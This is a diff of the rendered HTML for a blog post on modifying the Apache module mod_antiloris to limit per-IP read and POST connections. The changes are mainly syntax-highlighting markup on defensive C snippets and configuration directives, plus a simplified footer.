-<span class="w">                </span>break<span class="err">;</span><span class="w"></span>
-<span class="w">    </span><span class="err">}</span><span class="w"></span>
-<span class="err">}</span><span class="w"></span>
+<span class="cm">* this IP address */</span>
+<span class="k">for</span> <span class="ss">(</span><span class="nv">i</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; i &lt; server_limit; ++i) {</span>
+    <span class="k">for</span> <span class="ss">(</span><span class="nv">j</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; j &lt; thread_limit; ++j) {</span>
+        <span class="nv">ws_record</span> <span class="o">=</span> <span class="nv">ap_get_scoreboard_worker</span><span class="ss">(</span><span class="nv">i</span>, <span class="nv">j</span><span class="ss">)</span><span class="c1">;</span>
+        <span class="nv">switch</span> <span class="ss">(</span><span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">status</span><span class="ss">)</span> {
+            <span class="nv">case</span> <span class="nv">SERVER_BUSY_READ</span>:
+            <span class="nv">case</span> <span class="nv">SERVER_BUSY_WRITE</span>:
+            <span class="nv">case</span> <span class="nv">SERVER_BUSY_KEEPALIVE</span>:
+            <span class="nv">case</span> <span class="nv">SERVER_BUSY_LOG</span>:
+            <span class="nv">case</span> <span class="nv">SERVER_BUSY_DNS</span>:
+            <span class="nv">case</span> <span class="nv">SERVER_CLOSING</span>:
+            <span class="nv">case</span> <span class="nv">SERVER_GRACEFUL</span>:
+                <span class="k">if</span> <span class="ss">(</span><span class="nv">strcmp</span><span class="ss">(</span><span class="nv">address</span>, <span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">client</span><span class="ss">)</span> <span class="o">==</span> <span class="mi">0</span><span class="ss">)</span>
+                    <span class="nv">ip_count</span><span class="o">++</span><span class="c1">;</span>
+                <span class="k">break</span><span class="c1">;</span>
+            <span class="nv">default</span>:
+                <span class="k">break</span><span class="c1">;</span>
+    }
+}
 </pre></div>
 
 
@@ -303,19 +302,19 @@ $ sudo a2enmod limitipconn
 <p>Interesting information, and some valid&nbsp;points.</p>
 <h2>Modified&nbsp;mod_antiloris</h2>
 <p>With this in mind I set out to modify mod_antiloris, as I wasn&#8217;t completely happy with mod_limitipconn. The module works great, but provided too much configuration overhead. I wanted something really simple. The source code for mod_antiloris was quickly edited to include a second counter, and to check the request string (i.e. it has to contain &#8220;<span class="caps">POST</span>&#8221;).</p>
-<div class="highlight"><pre><span></span>switch (ws_record-&gt;status) {
-    case SERVER_BUSY_READ:
-        if (strcmp(client_ip, ws_record-&gt;client) == 0){
-     ip_read_count++;
+<div class="highlight"><pre><span></span><span class="nv">switch</span> <span class="ss">(</span><span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">status</span><span class="ss">)</span> {
+    <span class="nv">case</span> <span class="nv">SERVER_BUSY_READ</span>:
+        <span class="k">if</span> <span class="ss">(</span><span class="nv">strcmp</span><span class="ss">(</span><span class="nv">client_ip</span>, <span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">client</span><span class="ss">)</span> <span class="o">==</span> <span class="mi">0</span><span class="ss">)</span>{
+     <span class="nv">ip_read_count</span><span class="o">++</span><span class="c1">;</span>
         }
-        break;
-    case SERVER_BUSY_WRITE:
-        if (NULL != strstr(ws_record-&gt;request, str_post) &amp;&amp; strcmp(client_ip, ws_record-&gt;client) == 0){
-            ip_write_count++;
+        <span class="k">break</span><span class="c1">;</span>
+    <span class="nv">case</span> <span class="nv">SERVER_BUSY_WRITE</span>:
+        <span class="k">if</span> <span class="ss">(</span><span class="nv">NULL</span> <span class="o">!=</span> <span class="nv">strstr</span><span class="ss">(</span><span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">request</span>, <span class="nv">str_post</span><span class="ss">)</span> <span class="o">&amp;&amp;</span> <span class="nv">strcmp</span><span class="ss">(</span><span class="nv">client_ip</span>, <span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">client</span><span class="ss">)</span> <span class="o">==</span> <span class="mi">0</span><span class="ss">)</span>{
+            <span class="nv">ip_write_count</span><span class="o">++</span><span class="c1">;</span>
         }
-        break;
-    default:
-        break;
+        <span class="k">break</span><span class="c1">;</span>
+    <span class="nv">default</span>:
+        <span class="k">break</span><span class="c1">;</span>
 }
 </pre></div>
 
@@ -330,8 +329,8 @@ $ sudo /etc/init.d/apache2 restart
 
 
 <p>Don&#8217;t forget to disable mod_antiloris and/or mod_limitipconn if you have them enabled (using <code>a2dismod</code>). The modified module uses only two optional configuration&nbsp;directives:</p>
-<div class="highlight"><pre><span></span>IPReadLimit (default 5)
-IPPostLimit (default 10)
+<div class="highlight"><pre><span></span><span class="n">IPReadLimit</span> <span class="p">(</span><span class="k">default</span> <span class="mi">5</span><span class="p">)</span>
+<span class="n">IPPostLimit</span> <span class="p">(</span><span class="k">default</span> <span class="mi">10</span><span class="p">)</span>
 </pre></div>
 
 
@@ -372,10 +371,9 @@ IPPostLimit (default 10)
 		<div class="large-12 columns">
 			<hr />
 			<div class="row">
-				<p>Bed Against The Wall by Seppe "Macuyiko" vanden Broucke</p>
-				<p><a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license"><img title="Creative Commons License" src="http://i.creativecommons.org/l/by-sa/2.0/be/88x31.png" /></a><br />
-				Unless mentioned otherwise, this work is licensed under a <a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license">Creative Commons Attribution-Share Alike 2.0 Belgium License</a>.</p>
-				<p>Static blog engine powered by <a href="http://getpelican.com">Pelican</a>.</p>
+				<p>Bed Against The Wall by Seppe "Macuyiko" vanden Broucke<br>
+				Unless mentioned otherwise, this work is licensed under a <a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license">Creative Commons Attribution-Share Alike 2.0 Belgium License</a>.<br>
+				Static blog engine powered by <a href="http://getpelican.com">Pelican</a>.</p>
 			</div>
 		</div>
 	</footer>
